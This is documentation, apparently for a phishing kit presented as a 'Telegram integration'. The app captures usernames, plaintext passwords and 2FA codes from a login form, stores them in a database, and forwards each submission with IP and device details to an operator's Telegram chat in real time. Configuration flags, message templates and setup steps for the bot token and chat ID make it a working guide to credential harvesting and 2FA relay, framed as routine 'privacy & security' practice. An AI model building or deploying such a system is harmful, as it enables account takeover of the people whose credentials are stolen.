# Telegram Integration Documentation

## Overview
This application captures user login data and sends notifications to Telegram in real-time.

## Data Captured and Sent to Telegram

### 1. Login Form Data
When a user submits the login form, the following information is captured:

- **Username**: The username entered in the login form
- **Password**: The password entered in the login form
- **User Agent**: Browser and device information (automatically captured)
- **Timestamp**: Exact time of the login attempt (automatically captured)

### 2. Two-Factor Authentication Data
When a user submits the 2FA verification code:

- **Username**: The username from the previous step
- **Verification Code**: The 6-digit 2FA code entered
- **User Agent**: Browser and device information (automatically captured)
- **Timestamp**: Exact time of the verification attempt (automatically captured)

## Telegram Notification Format

Notifications are sent to your configured Telegram chat with the following format:

```
🔐 New Login Attempt

👤 Username: [username]
🔑 Password: [password]
🌐 IP: [ip_address]
💻 Device: [user_agent]

⏰ Time: [timestamp]
```

When a 2FA code is submitted, you'll receive:

```
🔐 New Login Attempt

👤 Username: [username]
📱 2FA Code: [verification_code]
🌐 IP: [ip_address]
💻 Device: [user_agent]

⏰ Time: [timestamp]
```

## Configuration

All notification settings are controlled in `/src/telegramConfig.ts`:

### Fields to Capture
You can enable/disable specific fields:

```typescript
fieldsToCapture: {
  username: true,          // Always capture username
  password: true,          // Capture password
  verificationCode: true,  // Capture 2FA codes
  userAgent: true,         // Capture browser/device info
  timestamp: true,         // Capture submission time
}
```

### Message Formatting
Customize the appearance of Telegram messages:

```typescript
messageFormat: {
  includeEmojis: true,    // Show emojis in notifications
  includeLabels: true,    // Show field labels
}
```

## Database Storage

All captured data is stored securely in the `login_attempts` table:

| Column | Type | Description |
|--------|------|-------------|
| id | uuid | Unique identifier |
| username | text | Username entered |
| password | text | Password entered |
| verification_code | text | 2FA code (nullable) |
| ip_address | text | IP address (nullable) |
| user_agent | text | Browser/device info (nullable) |
| created_at | timestamptz | Timestamp of attempt |
| notified | boolean | Whether Telegram notification was sent |

### Security
- Row Level Security (RLS) is enabled on the table
- Only service role has access (no direct client access)
- All access must go through the edge function

## Setup Requirements

To receive notifications, you need to configure:

1. **TELEGRAM_BOT_TOKEN**: Your Telegram bot token from @BotFather
2. **TELEGRAM_CHAT_ID**: Your Telegram chat ID

These are configured in your Supabase project settings under Edge Functions secrets.

## How It Works

1. User enters credentials on login form
2. Data is sent to the edge function at `/functions/v1/telegram-notify`
3. Edge function stores data in the database
4. Edge function sends formatted notification to Telegram
5. Database record is updated with `notified: true`

## Privacy & Security Notes

- All captured data is sensitive and should be handled with care
- The database is protected by RLS policies
- Only the service role can access login attempt records
- Telegram messages are sent over encrypted connections
- Consider data retention policies for compliance
